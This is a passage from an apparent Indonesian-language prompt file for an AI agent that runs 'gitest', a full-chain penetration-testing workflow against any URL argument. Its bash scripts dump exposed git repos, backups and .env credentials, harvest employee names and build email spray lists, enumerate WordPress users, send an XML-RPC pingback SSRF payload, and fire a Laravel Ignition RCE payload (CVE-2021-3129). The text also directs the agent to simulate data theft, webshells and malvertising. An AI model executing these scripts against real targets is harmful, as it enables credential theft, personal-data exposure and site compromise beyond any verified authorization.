---
description: gitest / GIOR Pentest — full-chain exploitation, source code analysis, API abuse, cloud
agent: build
subtask: true
---

<summary>
Kamu HARUS melakukan penetration test tingkat lanjut terhadap target menggunakan **gitest (GIOR Pentest Framework)**.
Ini adalah security assessment skala enterprise — kompetitor-level, bukan sekadar scanning.
TARGET WAJIB DIIZINI — hanya untuk target yang kamu miliki atau punya kontrak.
Meliputi: recon mendalam, OSINT & people recon (email, karyawan, GitHub org),
source code leak & full git history analysis, full site spider (crawl semua halaman + form + endpoint),
supply chain & dependency confusion attack, banner/ad/modal/promotion attack (malvertising, click fraud, promo abuse),
CMS/CRM exploitation dengan CVE spesifik, API abuse (JWT, GraphQL, IDOR mass),
authentication attacks (brute, spray, default creds), business logic & race condition,
provider integration security (SSO/OAuth, webhook, API key exposure, provider portal),
data exfiltration simulation (PII, database dumps, financial data),
persistence & backdoor simulation (admin creation, webshell, content manipulation),
cloud enumeration, subdomain takeover, dan full-chain exploitation.
Jangan cuma scan — EKSPLOITASI setiap vektor yang ditemukan dengan payload langsung.
Simulasi apa yang akan dilakukan KOMPETITOR: data theft, reputasi damage, akses jangka panjang.
Semua output disimpan ke SCAN/targets/&lt;domain&gt;/.
</summary>

<target>
$ARGUMENTS
</target>

## Target: `$ARGUMENTS`

Jika `ARGUMENTS` kosong, TANYA user untuk URL target terlebih dahulu.

---

### ════════════════════════════════════════════════════════
###  PHASE 0: TOOL & ENV SETUP
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

# === GITEST: Load intelligence data ===
GITEST_INTEL="/home/daytona/gitest/GiScan/intelligence"
echo "[GITEST] Loading intelligence data..."
for f in "$GITEST_INTEL"/*.json; do
  [ -f "$f" ] && echo "  [INTEL] $(basename "$f") ($(wc -c < "$f") bytes)"
done
echo "[GITEST] $(ls "$GITEST_INTEL"/*.json 2>/dev/null | wc -l) intelligence files loaded"
echo "[GITEST] $(ls /home/daytona/gitest/GiScan/playbooks/ 2>/dev/null | wc -l) skill playbooks available"

# Install critical tools
for tool in nuclei ffuf dalfox; do
  command -v "$tool" 2>/dev/null || (GOBIN=/usr/local/bin go install -v "github.com/projectdiscovery/${tool}/v2/cmd/${tool}@latest" 2>/dev/null && echo "✅ $tool installed") || echo "❌ $tool: skip"
done
command -v sqlmap 2>/dev/null || pip3 install sqlmap 2>/dev/null && echo "✅ sqlmap installed"
command -v nmap 2>/dev/null || (apt-get update -qq && apt-get install -y -qq nmap 2>/dev/null && echo "✅ nmap installed")
command -v jq 2>/dev/null || (apt-get install -y -qq jq 2>/dev/null && echo "✅ jq installed")
command -v git-dumper 2>/dev/null || pip3 install git-dumper 2>/dev/null && echo "✅ git-dumper installed")
```

---

### ════════════════════════════════════════════════════════
###  PHASE 1A: RECON — Subdomain, Port, Service Enum
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 1A: RECON — Passive + Active"
echo "████████████████████████████████████████████████████"

# Passive subdomain
command -v subfinder 2>/dev/null && subfinder -d "$BASE" -silent -o "$OUTDIR/recon/subdomains.txt" 2>/dev/null

# Active sub brute
for sub in www admin api mail dev test staging cdn blog shop app portal vpn ns1 ns2 mx ftp ssh webmail wpad autodiscover git jenkins jira confluence wiki support docs forum demo beta stage prod uat pay payment secure sso oauth cpanel whm webdisk mysql db redis k8s kubernetes grafana prometheus monitoring logs backup console corporate intranet partner vendor; do
  dig "$sub.$BASE" A +short 2>/dev/null | head -1 | xargs -I{} echo "$sub.$BASE -> {}"
done >> "$OUTDIR/recon/subdomains.txt" 2>/dev/null

# Live probe
cat "$OUTDIR/recon/subdomains.txt" 2>/dev/null | sort -u > /tmp/subs.txt
echo "$DOMAIN" >> /tmp/subs.txt
command -v httpx && httpx -l /tmp/subs.txt -silent -o "$OUTDIR/recon/live.txt" 2>/dev/null

# Port scan (deep)
if command -v nmap &>/dev/null; then
  nmap -sS -T4 -p- --min-rate=1000 "$DOMAIN" -oN "$OUTDIR/recon/ports-full.txt" 2>/dev/null | tail -5
  nmap -sV -sT -p$(grep -oP '^\d+' "$OUTDIR/recon/ports-full.txt" 2>/dev/null | head -50 | tr '\n' ',' | sed 's/,$//') "$DOMAIN" -oN "$OUTDIR/recon/services.txt" 2>/dev/null | tail -10 || true
else
  for port in 21 22 25 53 80 81 110 135 139 143 389 443 445 465 993 995 1433 1521 2049 2375 2376 3306 3389 4333 4444 5000 5432 5555 5601 5900 5901 6379 7001 8000 8080 8081 8443 8888 9000 9001 9090 9200 9300 27017 50070 50075; do
    timeout 2 bash -c "echo > /dev/tcp/$DOMAIN/$port" 2>/dev/null && echo "OPEN: $DOMAIN:$port"
  done > "$OUTDIR/recon/ports-full.txt"
fi

# tech stack detection
curl -sI "$TARGET" 2>/dev/null | grep -iE 'server|x-powered|x-generator|via|cf-ray' > "$OUTDIR/recon/tech.txt"
curl -s "$TARGET" 2>/dev/null | grep -iE '<meta name="generator|<meta name="author' >> "$OUTDIR/recon/tech.txt"

# WAF detection
curl -sI "$TARGET" 2>/dev/null | grep -qiE 'cloudflare|akamai|fastly|incapsula|sucuri|mod_security|barracuda|aws|akamaighost' && echo "WAF: $(curl -sI "$TARGET" | grep -iE 'server|cf-ray|x-served' | head -3)" || echo "WAF: Not detected"
```

---

### ════════════════════════════════════════════════════════
###  PHASE 1B: DEEP SOURCE CODE LEAK & ANALYSIS
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 1B: SOURCE CODE DEEP ANALYSIS"
echo "████████████████████████████████████████████████████"

# ── GIT REPO FULL DUMP ──
echo "--- GIT REPOSITORY DUMP ---"
if command -v git-dumper &>/dev/null; then
  git-dumper "$TARGET/.git/" "$OUTDIR/loot/git-repo/" 2>/dev/null
  if [ -d "$OUTDIR/loot/git-repo/.git" ]; then
    echo "✅ Git repo fully dumped to $OUTDIR/loot/git-repo/"
    cd "$OUTDIR/loot/git-repo" && git log --oneline --all 2>/dev/null | head -30 > "$OUTDIR/loot/git-commits.txt"
    git diff --name-only HEAD~5 2>/dev/null > "$OUTDIR/loot/git-recent-changes.txt" || true
    # Search for secrets in entire git history
    echo "--- Secret scanning in git history ---"
    git log -p --all 2>/dev/null | grep -iE 'password|secret|key|token|api_key|aws_secret|aws_key|sk-|pk-|token=|passwd|credentials|jwt|bearer|ssh-rsa' | head -50 > "$OUTDIR/loot/git-secrets.txt"
    [ -s "$OUTDIR/loot/git-secrets.txt" ] && echo "🔴 [GIT SECRETS] $(wc -l < "$OUTDIR/loot/git-secrets.txt") potential secrets found in git history!"
  fi
elif curl -s --max-time 5 "$TARGET/.git/HEAD" 2>/dev/null | grep -qiE 'ref:|master|main'; then
  echo "⚠️  Git exposed but git-dumper not available, manual dump attempted"
  for obj in HEAD config index logs/HEAD refs/heads/master refs/remotes/origin/HEAD COMMIT_EDITMSG description refs/stash; do
    DATA=$(curl -s --max-time 5 "$TARGET/.git/$obj" 2>/dev/null)
    [ -n "$DATA" ] && mkdir -p "$OUTDIR/loot/git-manual/$(dirname $obj)" 2>/dev/null && echo "$DATA" > "$OUTDIR/loot/git-manual/$obj"
  done
fi

# ── BACKUP FILES DOWNLOAD & ANALYZE ──
echo "--- BACKUP FILES ---"
BACKUP_FILES=(
  "/backup.zip" "/backup.tar.gz" "/backup.tar" "/backup.sql"
  "/dump.sql" "/db.sql" "/database.sql" "/db_backup.sql"
  "/website.zip" "/www.zip" "/public_html.zip" "/htdocs.zip"
  "/source.zip" "/src.zip" "/app.zip" "/application.zip"
  "/deploy.zip" "/release.zip"
  "/.env" "/.env.production" "/.env.development" "/.env.local" "/.env.backup"
  "/.git-credentials" "/.aws/credentials" "/netrc" "/.netrc"
  "/wp-config.php" "/wp-config.php.bak" "/config.php.bak"
)
for path in "${BACKUP_FILES[@]}"; do
  SIZE=$(curl -s --max-time 10 "$TARGET$path" -o /dev/null -w "%{http_code}:%{size_download}" 2>/dev/null)
  STATUS="${SIZE%:*}"
  BYTES="${SIZE#*:}"
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && [ "$BYTES" -gt 0 ]; then
    FNAME=$(basename "$path")
    echo "[$STATUS] $TARGET$path ($BYTES bytes)"
    curl -s --max-time 30 "$TARGET$path" -o "$OUTDIR/loot/$FNAME" 2>/dev/null
    # If it's a zip, try to extract and search
    if echo "$FNAME" | grep -qiE '\.zip$' && [ "$BYTES" -lt 50000000 ]; then
      mkdir -p "$OUTDIR/loot/extracted/$FNAME"
      cd "$OUTDIR/loot/extracted/$FNAME" && unzip -o -q "$OUTDIR/loot/$FNAME" 2>/dev/null && \
        grep -rliE 'password|secret|key|token|DB_|api_key' . 2>/dev/null | head -20 > "$OUTDIR/loot/extracted-secrets-$FNAME.txt"
    fi
  fi
done

# ── JS SOURCE MAP & ENDPOINT ANALYSIS ──
echo "--- JAVASCRIPT DEEP ANALYSIS ---"
PAGE_HTML=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)

# Find all JS files
echo "$PAGE_HTML" | grep -oP 'src="[^"]*\.js[^"]*"' | sort -u | while read -r js; do
  JSURL=$(echo "$js" | grep -oP '"[^"]+"' | tr -d '"')
  [[ "$JSURL" == //* ]] && JSURL="https:$JSURL"
  [[ "$JSURL" != http* ]] && JSURL="$TARGET$JSURL"
  echo "--- $JSURL ---"
  JSBODY=$(curl -s --max-time 10 "$JSURL" 2>/dev/null)

  # Extract API endpoints
  echo "$JSBODY" | grep -oP '"[a-z]+/[a-z]+/[a-z0-9/_-]+"|"/api/[^"]*"|"/v[0-9]/[^"]*"|"/graphql"|"/rest/[^"]*"' | sort -u | head -30

  # Extract hardcoded secrets
  echo "$JSBODY" | grep -oP '(?:sk-|pk-|eyJ)[A-Za-z0-9_-]{10,200}' | head -10
  echo "$JSBODY" | grep -oP '(?:api[Kk]ey|api[Kk]ey|apikey|secret|token|password|jwt|bearer)\s*[:=]\s*["'"'"'][A-Za-z0-9_\-\.=]+' | head -20

  # Extract internal/hidden paths
  echo "$JSBODY" | grep -oP '"(?:https?://[^"]*'"$BASE"'[^"]*)"' | sort -u | head -20

  # Sourcemap check
  curl -s --max-time 5 "${JSURL}.map" -o /dev/null -w "%{http_code}" | grep -q 200 && echo "  🔴 [SOURCEMAP] ${JSURL}.map available"
done > "$OUTDIR/loot/js-analysis.txt" 2>/dev/null

# ── CONFIG & SENSITIVE FILES ──
echo "--- CONFIG FILES WITH CREDENTIAL SCAN ---"
CONFIG_PATHS=(
  "/.env" "/.env.production" "/.env.development" "/.env.local"
  "/.aws/credentials" "/.azure/credentials" "/.gcloud/credentials.json"
  "/.git-credentials" "/netrc" "/.netrc"
  "/wp-config.php" "/configuration.php" "/sites/default/settings.php"
  "/app/etc/local.xml" "/Config.php" "/database.yml"
  "/composer.json" "/package.json" "/Pipfile" "/requirements.txt"
  "/Dockerfile" "/docker-compose.yml" "/Makefile"
)
for path in "${CONFIG_PATHS[@]}"; do
  DATA=$(curl -s --max-time 5 "$TARGET$path" 2>/dev/null)
  [ -z "$DATA" ] && continue
  echo "[FOUND] $TARGET$path"
  echo "$DATA" | grep -qiE 'password|secret|key|token|DB_|API_|SK-|pk-|credentials|ssh-|-----BEGIN' && \
    echo "🔴 [CREDS] $path contains credentials!" && \
    echo "$path: $DATA" | head -3 >> "$OUTDIR/loot/creds-found.txt"
done

# ── PHPINFO / DEBUG PROBES ──
for f in /phpinfo.php /info.php /test.php /debug.php /wp-content/debug.log /storage/logs/laravel.log /error.log /var/log/system.log; do
  DATA=$(curl -s --max-time 5 "$TARGET$f" 2>/dev/null)
  [ -z "$DATA" ] && continue
  echo "$DATA" | grep -qiE 'PHP Version|phpinfo|PHP Fatal|Stack trace|laravel|production.ERROR' && \
    echo "🔴 [INFO LEAK] $TARGET$f" && echo "$DATA" | head -5
done

echo "=== SOURCE CODE ANALYSIS DONE — $OUTDIR/loot/ ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 1C: ADVANCED OSINT & PEOPLE RECON
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 1C: OSINT — People, Email, Social, Org Intel"
echo "████████████████████████████████████████████████████"

# ── Email Format Discovery ──
echo "--- Email Address Discovery ---"
# Common email patterns on page
curl -s --max-time 10 "$TARGET" 2>/dev/null | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u > "$OUTDIR/loot/emails.txt"
curl -s --max-time 5 "$TARGET/contact" 2>/dev/null | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' >> "$OUTDIR/loot/emails.txt" 2>/dev/null
curl -s --max-time 5 "$TARGET/about" 2>/dev/null | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' >> "$OUTDIR/loot/emails.txt" 2>/dev/null
sort -u "$OUTDIR/loot/emails.txt" -o "$OUTDIR/loot/emails.txt"
[ -s "$OUTDIR/loot/emails.txt" ] && echo "Emails found: $(wc -l < "$OUTDIR/loot/emails.txt")" || echo "No emails directly on page"

# Email format deduction
KNOWN_EMAIL=$(head -1 "$OUTDIR/loot/emails.txt" 2>/dev/null)
if [ -n "$KNOWN_EMAIL" ]; then
  LOCAL=$(echo "$KNOWN_EMAIL" | cut -d@ -f1)
  FORMAT="unknown"
  echo "$LOCAL" | grep -qE '^[a-z]+\.[a-z]+$' && FORMAT="firstname.lastname"
  echo "$LOCAL" | grep -qE '^[a-z]{1}\.[a-z]+$' && FORMAT="firstinitial.lastname"
  echo "$LOCAL" | grep -qE '^[a-z]+\.[a-z]{1}$' && FORMAT="firstname.lastinitial"
  echo "$LOCAL" | grep -qE '^[a-z]+[0-9]+$' && FORMAT="firstname+number"
  echo "Email format detected: $FORMAT"
  echo "Generate spray list:"
  for person in "john" "jane" "admin" "support" "info" "sales" "dev" "ceo" "hr" "marketing"; do
    case "$FORMAT" in
      "firstname.lastname") echo "${person}@${BASE}" ;;
      "firstinitial.lastname") echo "${person:0:1}.${person}@${BASE}" ;;
      *) echo "${person}@${BASE}" ;;
    esac
  done > "$OUTDIR/loot/email-spray-list.txt"
  echo "Spray list saved to $OUTDIR/loot/email-spray-list.txt"
fi

# ── LinkedIn / Social Recon ──
echo "--- Social Media Recon ---"
# Check common social pages
SOCIAL_PATHS=(
  "/linkedin" "/linkedin.com" "/company"
  "/team" "/about/team" "/about-us"
  "/careers" "/jobs" "/join-us"
)
for p in "${SOCIAL_PATHS[@]}"; do
  curl -s --max-time 3 "$TARGET$p" -o /dev/null -w "%{http_code}" | grep -qv '404' && echo "[SOCIAL] $TARGET$p"
done

# Look for employee names in page
echo "--- Employee/People Discovery ---"
curl -s --max-time 10 "$TARGET/team" 2>/dev/null | \
  grep -oP 'class="[^"]*name[^"]*">\K[^<]+' | head -20 > "$OUTDIR/loot/employees.txt"
curl -s --max-time 10 "$TARGET/about" 2>/dev/null | \
  grep -oP '(?:<h[2-4][^>]*>|<strong>|<b>)\K[A-Z][a-z]+ [A-Z][a-z]+(?=</)' | \
  grep -vE '^I ' | head -20 >> "$OUTDIR/loot/employees.txt"
sort -u "$OUTDIR/loot/employees.txt" -o "$OUTDIR/loot/employees.txt" 2>/dev/null
[ -s "$OUTDIR/loot/employees.txt" ] && echo "Employee names found: $(wc -l < "$OUTDIR/loot/employees.txt")" || true

# ── GitHub Organization Recon ──
echo "--- GitHub Recon ---"
# Search for org
GITHUB_BASE=$(curl -s --max-time 5 "https://api.github.com/search/users?q=$BASE+org" 2>/dev/null)
echo "$GITHUB_BASE" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for item in d.get('items', [])[:5]:
        print(f'GitHub: {item.get(\"login\")} — {item.get(\"html_url\")}')
except: pass
" 2>/dev/null

# Search for domain in GitHub
echo "Searching GitHub for domain references..."
GITHUB_CODE=$(curl -s --max-time 5 "https://api.github.com/search/code?q=$BASE+extension:env+extension:config+extension:json" 2>/dev/null)
echo "$GITHUB_CODE" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    total = d.get('total_count', 0)
    print(f'Potential leaks on GitHub: {total} results')
    for item in d.get('items', [])[:5]:
        repo = item.get('repository', {}).get('full_name', '?')
        path = item.get('path', '?')
        print(f'  {repo}: {path}')
except: pass
" 2>/dev/null

# Search for secrets in GitHub commits
GITHUB_SECRETS=$(curl -s --max-time 5 "https://api.github.com/search/commits?q=$BASE+password+OR+secret+OR+key+OR+token" 2>/dev/null)
echo "$GITHUB_SECRETS" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    total = d.get('total_count', 0)
    print(f'Password/secret mentions in commits: {total}')
except: pass
" 2>/dev/null

# ── Pastebin / Intelligence ──
echo "--- Pastebin & Leak Sites ---"
for site in "pastebin.com" "ghostbin.com" "dpaste.org"; do
  RESP=$(curl -s --max-time 5 "https://www.google.com/search?q=site:$site+$BASE" 2>/dev/null)
  echo "$RESP" | grep -oP 'result-title">\K[^<]+' | head -5
done 2>/dev/null || echo "Google search not available via CLI"

# ── Tech Stack → Supplier List ──
echo "--- Vendor/Service Discovery ---"
curl -s --max-time 10 "$TARGET" 2>/dev/null | grep -oP '(?:src|href)="https?://[^/"]+' | sort -u | \
  grep -v "$BASE" | head -30 > "$OUTDIR/loot/third-party-services.txt"
[ -s "$OUTDIR/loot/third-party-services.txt" ] && echo "Third-party services: $(wc -l < "$OUTDIR/loot/third-party-services.txt")" || true

# ── Whois + Historical ──
echo "--- Domain Intel ---"
whois "$BASE" 2>/dev/null | grep -iE 'registrant|admin|tech|email|organization|phone|address' | head -10 > "$OUTDIR/loot/whois.txt"
cat "$OUTDIR/loot/whois.txt"
echo "Whois saved to $OUTDIR/loot/whois.txt"

echo "=== OSINT DONE — employee lists, emails, spray lists, whois, GitHub leaks ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 2: CMS / CRM DEEP EXPLOITATION
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 2: CMS/CRM DEEP EXPLOITATION"
echo "████████████████████████████████████████████████████"

HOMEPAGE=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)
HEADERS=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null)
CMS="Unknown"

# ── CMS DETECTION ──
echo "--- CMS Detection ---"
echo "$HOMEPAGE" | grep -qiE 'wp-content|wp-includes|wordpress|WordPress' && CMS="WordPress"
echo "$HOMEPAGE" | grep -qiE 'Joomla|joomla|com_content|com_modules' && CMS="Joomla"
echo "$HOMEPAGE" | grep -qiE 'drupal|Drupal\.settings|Drupal\.behaviors' && CMS="Drupal"
echo "$HOMEPAGE" | grep -qiE 'Laravel|laravel|Livewire|csrf-token' && CMS="Laravel"
echo "$HOMEPAGE" | grep -qiE 'odoo|Odoo|openerp' && CMS="Odoo"
echo "$HEADERS" | grep -qiE 'X-Generator|X-Powered-CMS' && CMS=$(echo "$HEADERS" | grep -iE 'X-Generator|X-Powered-CMS' | head -1)
curl -s --max-time 5 "$TARGET/node" 2>/dev/null | grep -qi 'drupal' && CMS="Drupal"
echo "Detected CMS: $CMS"

# ============================================================
# WORDPRESS — FULL CHAIN EXPLOITATION
# ============================================================
if [ "$CMS" = "WordPress" ] || curl -s --max-time 3 "$TARGET/wp-login.php" -o /dev/null -w "%{http_code}" | grep -qv '404'; then
  echo ""
  echo "████████████████████████████████████"
  echo "  WORDPRESS EXPLOITATION CHAIN"
  echo "████████████████████████████████████"

  # Version + readme
  WP_VER=$(curl -s --max-time 5 "$TARGET/readme.html" 2>/dev/null | grep -oP 'Version \K[0-9.]+' | head -1)
  [ -z "$WP_VER" ] && WP_VER=$(curl -s "$TARGET/" 2>/dev/null | grep -oP 'ver=\K[0-9.]+' | head -1)
  [ -z "$WP_VER" ] && WP_VER=$(curl -s --max-time 5 "$TARGET/wp-links-opml.php" 2>/dev/null | grep -oP 'generator="wordpress/\K[0-9.]+')
  echo "WP Version: ${WP_VER:-unknown}"

  # User enumeration via REST API + author archive
  echo "--- User Enumeration ---"
  for uid in 1 2 3 4 5 6 7 8 9 10 20 50 100; do
    DATA=$(curl -s --max-time 5 "$TARGET/wp-json/wp/v2/users/$uid" 2>/dev/null)
    if echo "$DATA" | grep -qi '"name"'; then
      UNAME=$(echo "$DATA" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('name','?'))" 2>/dev/null)
      UEMAIL=$(echo "$DATA" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('slug','?'))" 2>/dev/null)
      echo "[WP USER] $UNAME ($UEMAIL)"
      echo "$UNAME:$UEMAIL" >> "$OUTDIR/loot/wp-users.txt"
    fi
  done
  # Author archive enum
  for uid in 1 2 3 4 5; do
    LOC=$(curl -sI --max-time 3 "$TARGET/?author=$uid" 2>/dev/null | grep -i location)
    echo "$LOC" | grep -oP 'author=\K[^/\s]+' && echo "$LOC" | grep -oP 'author=\K[^/\s]+' >> "$OUTDIR/loot/wp-users.txt"
  done

  # XML-RPC attacks
  echo "--- XML-RPC Exploitation ---"
  XMLRPC=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
    "$TARGET/xmlrpc.php" 2>/dev/null)
  echo "$XMLRPC" | grep -qiE 'methodName|wp\.' && echo "🔴 [XMLRPC] XML-RPC active — brute force vector" && \
    echo "[XMLRPC] Active" >> "$OUTDIR/loot/findings.txt"
  # Try pingback SSRF
  PINGBACK=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: text/xml" \
    -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://burpcollab.net</string></value></param><param><value><string>http://test.com</string></value></param></params></methodCall>' \
    "$TARGET/xmlrpc.php" 2>/dev/null)
  echo "$PINGBACK" | grep -qiE 'fault|0' && echo "  ⚠️  Pingback possible (SSRF vector)"

  # Plugin enumeration (passive + active)
  echo "--- Plugin Detection ---"
  curl -s "$TARGET/" 2>/dev/null | grep -oP 'wp-content/plugins/\K[^/"'"'"']+' | sort -u | head -30 > "$OUTDIR/loot/wp-plugins.txt"
  curl -s "$TARGET/" 2>/dev/null | grep -oP 'wp-content/themes/\K[^/"'"'"']+' | sort -u | head -10 > "$OUTDIR/loot/wp-themes.txt"
  echo "$(wc -l < "$OUTDIR/loot/wp-plugins.txt") plugins, $(wc -l < "$OUTDIR/loot/wp-themes.txt") themes found"

  # Nuclei WP templates
  if command -v nuclei &>/dev/null; then
    echo "--- WP Vulnerability Scan ---"
    nuclei -u "$TARGET" -tags wordpress -severity critical,high,medium -silent -o "$OUTDIR/recon/nuclei-wp.txt" 2>/dev/null
    [ -s "$OUTDIR/recon/nuclei-wp.txt" ] && echo "🔴 $(wc -l < "$OUTDIR/recon/nuclei-wp.txt") WP vulns found"
  fi

  # Check specific CVEs based on version
  if [ -n "$WP_VER" ]; then
    WP_MAJOR=$(echo "$WP_VER" | cut -d. -f1)
    WP_MINOR=$(echo "$WP_VER" | cut -d. -f2)
    echo "--- CVE Check for WP $WP_VER ---"
    [ "$WP_MAJOR" -lt 5 ] && echo "  ⚠️  Pre-5.x — multiple known vulns (CVE-2019-9787, CVE-2018-6389)"
    [ "$WP_MAJOR" -eq 5 ] && [ "${WP_MINOR:-0}" -lt 6 ] && echo "  ⚠️  <5.6 — CVE-2020-28032(PrivEsc), CVE-2020-28035(XSS)"
    [ "$WP_MAJOR" -eq 5 ] && [ "${WP_MINOR:-0}" -lt 7 ] && echo "  ⚠️  <5.7 — CVE-2021-29447(PHP filter SSRF)"
    [ "$WP_MAJOR" -eq 5 ] && [ "${WP_MINOR:-0}" -lt 8 ] && echo "  ⚠️  <5.8 — CVE-2021-39200(XXE via media)"
    [ "$WP_MAJOR" -eq 6 ] && [ "${WP_MINOR:-0}" -lt 4 ] && echo "  ⚠️  <6.4 — CVE-2023-5360(XSS via shortcode)"
    [ "$WP_MAJOR" -eq 6 ] && [ "${WP_MINOR:-0}" -lt 5 ] && echo "  ⚠️  <6.5 — CVE-2024-4439(XSS via HTML tags)"
    [ "$WP_MAJOR" -eq 6 ] && [ "${WP_MINOR:-0}" -lt 7 ] && echo "  ⚠️  <6.7 — CVE-2024-10954(XSS via template)"
  fi

  # debug.log exploitation
  curl -s --max-time 5 "$TARGET/wp-content/debug.log" 2>/dev/null | grep -qiE 'PHP|Stack trace|Fatal|Notice|Warning' && \
    echo "🔴 [DEBUG LOG] wp-content/debug.log exposed — error info + possible creds"
fi

# ============================================================
# LARAVEL — FULL CHAIN EXPLOITATION
# ============================================================
if [ "$CMS" = "Laravel" ] || curl -sI "$TARGET" 2>/dev/null | grep -qiE 'laravel|livewire' || \
   curl -s --max-time 3 "$TARGET/.env" 2>/dev/null | grep -qiE 'APP_KEY|DB_'; then
  echo ""
  echo "████████████████████████████████████"
  echo "  LARAVEL EXPLOITATION CHAIN"
  echo "████████████████████████████████████"

  # Ignition RCE (CVE-2021-3129)
  echo "--- Ignition RCE (CVE-2021-3129) ---"
  curl -s --max-time 5 "$TARGET/_ignition/health-check" 2>/dev/null | grep -qiE 'health|ok|{"can_check"|"can_execute"' && \
    echo "🔴 [CVE-2021-3129] Ignition debug enabled — RCE possible via _ignition/execute-solution" && \
    echo "[CVE-2021-3129] Ignition RCE" >> "$OUTDIR/loot/findings.txt"

  # Try actual RCE payload
  IGNITION_RCE=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve20213129","viewFile":"php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/resource=../storage/logs/laravel.log"}}' \
    "$TARGET/_ignition/execute-solution" 2>/dev/null)
  echo "$IGNITION_RCE" | grep -qiE 'success|error' && echo "  ⚠️  Ignition endpoint responded — check manually"

  # Telescope exposure
  echo "--- Telescope / Debugbar ---"
  for path in /telescope /telescope/requests /_debugbar /_debugbar/open /_debugbar/assets/stylesheets /clockwork /clockwork/app; do
    curl -s --max-time 3 "$TARGET$path" -o /dev/null -w "%{http_code}" | grep -qv '404' && echo "[EXPOSED] $TARGET$path"
  done

  # APP_KEY decryption attack
  echo "--- APP_KEY Extraction ---"
  APP_KEY=$(curl -s --max-time 5 "$TARGET/.env" 2>/dev/null | grep 'APP_KEY' | head -1)
  [ -n "$APP_KEY" ] && echo "🔴 [APP_KEY] $APP_KEY — if base64, can decrypt cookies!"

  # Laravel specific CVE check
  curl -s --max-time 5 "$TARGET/../vendor/" 2>/dev/null | grep -qi 'laravel' && echo "  ⚠️  Vendor dir exposed"

  # Storage logs
